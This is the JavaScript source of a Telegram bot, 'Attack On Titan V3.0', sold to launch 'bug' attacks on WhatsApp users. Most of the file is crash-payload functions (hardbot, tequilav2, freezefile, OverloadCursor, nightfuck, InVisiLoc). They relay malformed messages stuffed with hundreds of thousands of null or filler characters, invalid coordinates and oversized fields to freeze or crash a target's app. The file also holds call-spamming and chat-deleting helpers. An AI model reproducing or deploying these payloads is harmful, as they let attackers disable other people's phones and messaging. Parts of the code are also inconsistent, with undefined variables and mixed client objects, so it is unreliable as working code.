});

bot.action('pesan', async (ctx) => {
    const guideMessage = `
╭═══════『 𝐏𝐄𝐒𝐀𝐍 』═══════⊱
│
├─────『 𝐁𝐞𝐬𝐭 𝐏𝐫𝐚𝐜𝐭𝐢𝐜𝐞𝐬 』
│ • sc ini masih banyak yang harus di update
│ • sc ini tidak di perjual belikan 
│ • sc ini hanya di jual oleh @Mrbonbons
│
├─────『 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐓𝐢𝐩𝐬 』
│ • informasi ada di channel wa bonsat
│ • https://whatsapp.com/channel/0029Vb9Zq7d4o7qQWCJ2N32Y
│ • jika bot ini bermasalah atau tidak mengirim bug hubungi bonsat
│
╰═════════════════════⊱`;

    try {
        // Hapus pesan sebelumnya
        await ctx.deleteMessage();

        // Kirim pesan baru dengan gambar
        await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
            caption: guideMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "BUG MENU",
                  callback_data: "bugmenu"
                    }]
                ]
            }
        });
    } catch (error) {
        // Fallback jika ada error
        await ctx.reply(guideMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "BUG MENU",
                        callback_data: "bugmenu"
                    }]
                ]
            }
        });
    }
});

bot.action('ownermenu', async (ctx) => {
    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
  ╭═══════『  𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎 』═══════⊱
  │
  ├─────『 𝐎𝐖𝐍𝐄𝐑 』═══════════⊱
  │ • /addadmin 
  │   
  │
  │ • /deladmin 
  │   
  │
  │ • /cekusersc 
  │   
  │
  │ • /monitoruser 
  │   
  │
  │ • /addpairing 
  │   
  │
  │ • /removebotallbot 
  │   
  │
  ├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
  │ • Mode: Active 
  │ • Owner: @Putrialpiran
  │
  ╰═════════════════════⊱
  
  *Devloper : @Putrialpiran*`;

    const mainKeyboard = [
        [{
            text: "𝐎𝐖𝐍𝐄𝐑",
            callback_data: "ownermenu"
        }],
        [{
            text: "MENU",
            callback_data: "main_menu"
        }]
    ];

    try {
        await ctx.deleteMessage();
        await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    } catch (error) {
        await ctx.reply(mainMenuMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
    try {
        await ctx.deleteMessage();
    } catch (error) {
        console.error("Error deleting message:", error);
    }

    const isPremium = isPremiumUser(ctx.from.id);
    const isAdminStatus = isAdmin(ctx.from.id);
    const isOwnerStatus = isOwner(ctx.from.id);

    const mainMenuMessage = `
╭═══════『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎 』═══════⊱
│
├─────『 𝐌𝐚𝐢𝐧 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬 』
│  *𝗦𝗧𝗔𝗧𝗨𝗦::* Active
│  *𝗣𝗿𝗲𝗺𝗶𝘂𝗺:* ${isPremium ? '✅ Active' : '❌ Not Active'}
│  *𝗔𝗱𝗺𝗶𝗻:* ${isAdminStatus ? '✅ Yes' : '❌ No'}
│
├─────『 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 』
│   /titanv2
│   /titanv3
│   /attackontitan
│   /xattack
│
╰═════════════════════⊱


*𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎| @Putrialpiran*
`;

    const mainKeyboard = [
        [{
            text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐌𝐞𝐧𝐮",
            callback_data: "developercmd"
        }],
        [{
                text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                callback_data: "bugmenu"
            },
            {
                text: "𝐀𝐝𝐦𝐢𝐧 𝐌𝐞𝐧𝐮",
                callback_data: "adminmenu"
            }
        ],
        [{
            text: "𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐈𝐧𝐟𝐨",
            callback_data: "premiuminfo"
        }]
    ];

    try {
        await ctx.replyWithPhoto("https://files.catbox.moe/cpmdxe.mp4", {
            caption: mainMenuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    } catch (error) {
        // Fallback jika gambar tidak tersedia
        await ctx.reply(mainMenuMessage, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: mainKeyboard
            }
        });
    }
});

async function BugIos(target) {
    for (let i = 0; i < 5; i++) {
        await hardbot(target);
        await tequilav2(target);
        await tequilav2(target);
        await hardbot(target);
    }
}

async function sendOfferCall(target) {
    try {
        await cay.offerCall(target);
        console.log(chalk.white.bold("Success Send Offer Call To Target"));
    } catch (error) {
        console.error(chalk.white.bold("Failed Send Offer Call To Target")), error;
    }
}
async function InVisiLoc(target, ptcp = false) {
    let etc = generateWAMessageFromContent(target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "⭑‌⟅‌༑ ▾ 𝐙‌𝐍‌𝐗 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻ ▾ ༑‌⟆‌‏‎‏‎‏‎‏⭑‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                            "locationMessage": {
                                "degreesLatitude": -999.03499999999999,
                                "degreesLongitude": 922.999999999999,
                                "name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                                "address": "🎭⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝑪‌𝒓𝒂‌‌𝒔𝒉ཀ‌‌🐉",
                                "jpegThumbnail": o,
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: ""
                        },
                        nativeFlowMessage: {
                            messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                            buttons: [{
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }],
                        },
                    }
                }
            }
        }), {
            userJid: target,
            quoted: QBug
        }
    );
    await cay.relayMessage(target, etc.message, ptcp ? {
        participant: {
            jid: target
        }
    } : {});
    console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
};

// Fungsi untuk menghapus semua pesan dari target
async function clearChat(target) {
    try {
        // Format nomor ke format JID
        const targetJid = targetNumber.includes("@s.whatsapp.net") ?
            targetNumber :
            `${target}@s.whatsapp.net`;

        // Periksa apakah target ada di daftar kontak
        const chats = zephy.chats.get(targetJid);
        if (!chats) {
            console.log("Target chat tidak ditemukan!");
            return;
        }

        // Hapus semua pesan di chat target
        await zephy.modifyChat(targetJid, "delete");
        console.log(`Semua pesan dengan ${target} telah dihapus.`);
    } catch (error) {
        console.error("Gagal menghapus chat:", error);
    }
}
async function hardbot(target) {
    try {
        let msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/21986779_1020055262365482_1348589645035994498_n.enc?ccb=11-4&oh=01_AdSiWbT4afeKnpYPqW3q6e9Zyk_kW-Xx8XZ6tin_tWV6oQ&oe=65AE7EC6&_nc_sid=5aebc0",
                        mimetype: "video/mp4",
                        fileSha256: "OXsqrJBQbWxzuZyeejkrzxwJGnx1KKsKtwX6HmNNopg=",
                        fileLength: "7595456",
                        seconds: 24,
                        mediaKey: "ly3ML0V/wxmLPoQ0FFGJoS+nOtRPQJwPCZP4n6pUVyE=",
                        height: 1024,
                        width: 576,
                        fileEncSha256: "WMgxGPybPS1TbS0UZ4mErxOY5GxL5pUij8ihXnzQBMw=",
                        directPath: "/v/t62.7161-24/21986779_1020055262365482_1348589645035994498_n.enc?ccb=11-4&oh=01_AdSiWbT4afeKnpYPqW3q6e9Zyk_kW-Xx8XZ6tin_tWV6oQ&oe=65AE7EC6&_nc_sid=5aebc0",
                        mediaKeyTimestamp: "1705666666",
                        jpegThumbnail: tdxlol,
                        viewOnce: true
                    }
                }
            }
        });
        await zephy.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
    } catch (error) {
        console.log(error);
    }
}

// Fungsi tequilav2
async function tequilav2(target) {
    try {
        let msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            jpegThumbnail: tdxlol,
                            titleText: "Crash" + "͏".repeat(25999),
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                    name: "ios_crash",
                                    buttonParamsJson: "͏".repeat(25999),
                                },
                                {
                                    name: "ios_crash2",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        });
        await zephy.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
    } catch (error) {
        console.log(error);
    }
}

//fix sc no error by jun

async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "🌸 𝗖‌𝗮‌𝘆𝘄‌𝘇𝘇‌𝗮𝗷𝗮‌" + "ꦾ".repeat(250000) + "@0".repeat(250000);
    await cay.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function OverloadCursor(target, ptcp = true) {
    const virtex = [{
            attrs: {
                biz_bot: "1"
            },
            tag: "bot",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];
    let messagePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Nusantara Crasher" + "ꦽ".repeat(16999),
                    listType: 2,
                    singleSelectReply: {
                        selectedRowId: "😹",
                    },
                    contextInfo: {
                        virtexId: zephy.generateMessageTag(),
                        participant: "13135550002@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        quotedMessage: {
                            buttonsMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "Z?" + "\u0000".repeat(97770),
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: tdxlol,
                                },
                                hasMediaAttachment: true,
                                contentText: 'XZCRASHER"👋"',
                                footerText: "|| VCS BY XZHEE ꦽ",
                                buttons: [{
                                        buttonId: "\u0000".repeat(170000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                ],
                                viewOnce: true,
                                headerType: 3,
                            },
                        },
                        conversionSource: "porn",
                        conversionData: crypto.randomBytes(16),
                        conversionDelaySeconds: 9999,
                        forwardingScore: 999999,
                        isForwarded: true,
                        quotedAd: {
                            advertiserName: " x ",
                            mediaType: "IMAGE",
                            jpegThumbnail: tdxlol,
                            caption: " x ",
                        },
                        placeholderKey: {
                            remoteJid: "13135550002@s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890",
                        },
                        expiration: -99999,
                        ephemeralSettingTimestamp: Date.now(),
                        ephemeralSharedSecret: crypto.randomBytes(16),
                        entryPointConversionSource: "❤️",
                        entryPointConversionApp: "💛",
                        actionLink: {
                            url: "https://t.me/alantequirasgtps",
                            buttonTitle: "Ampas",
                        },
                        disappearingMode: {
                            initiator: 1,
                            trigger: 2,
                            initiatorDeviceJid: target,
                            initiatedByMe: true,
                        },
                        groupSubject: "😼",
                        parentGroupJid: "😽",
                        trustBannerType: "😾",
                        trustBannerAction: 99999,
                        isSampled: true,
                        externalAdReply: {},
                        featureEligibilities: {
                            cannotBeReactedTo: true,
                            cannotBeRanked: true,
                            canRequestFeedback: true,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363274419384848@newsletter",
                            serverMessageId: 1,
                            newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                            contentType: 3,
                            accessibilityText: "kontol",
                        },
                        statusAttributionType: 2,
                        utm: {
                            utmSource: "utm",
                            utmCampaign: "utm2",
                        },
                    },
                    description: "@13135550002".repeat(2999),
                },
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16),
                    }),
                },
            },
        },
    };
    let sections = [];
    for (let i = 0; i < 1; i++) {
        let largeText = "\u0000".repeat(11999);
        let deepNested = {
            title: `Section ${i + 1}`,
            highlight_label: `Highlight ${i + 1}`,
            rows: [{
                title: largeText,
                id: `\u0000`.repeat(999),
                subrows: [{
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                        subsubrows: [{
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                            {
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                        ],
                    },
                    {
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                    },
                ],
            }, ],
        };
        sections.push(deepNested);
    }
    let listMessage = {
        title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
        sections: sections,
    };
    let msg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '!Paket atas nama bu siti?' + "ꦽ".repeat(29999),
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "zhee crash" + "\u0000".repeat(9999),
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                    name: "single_select",
                                    buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                            ],
                        }),
                    }),
                },
            },
        }), {
            userJid: target
        }
    );
    await zephy.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙱𝚄𝚃𝚃𝙾𝙽 𝚃𝙾 ${target}`);
    await zephy.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    await zephy.relayMessage(target, messagePayload, {
        additionalNodes: virtex,
        participant: {
            jid: target
        },
    });
    console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙲𝚄𝚁𝚂𝙾𝚁 𝚃𝙾 ${target}`);
}
async function  nightfuck(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Skibidi Bintang10." + "ꦽ".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Draculaxtzy ) "👋"',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(550000),
                    buttonText: {
                      displayText: "woy lu dimana, ini gua di warung",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: CrashVamp,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Whhwhahwha",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'Dracula?',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: CrashVamp,
              sourceUrl: "Terawehsono",
              sourceId: "Dracula - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Whahhhaa 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "P Ada dracula™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...\nFix by XJUNZNAIRE");
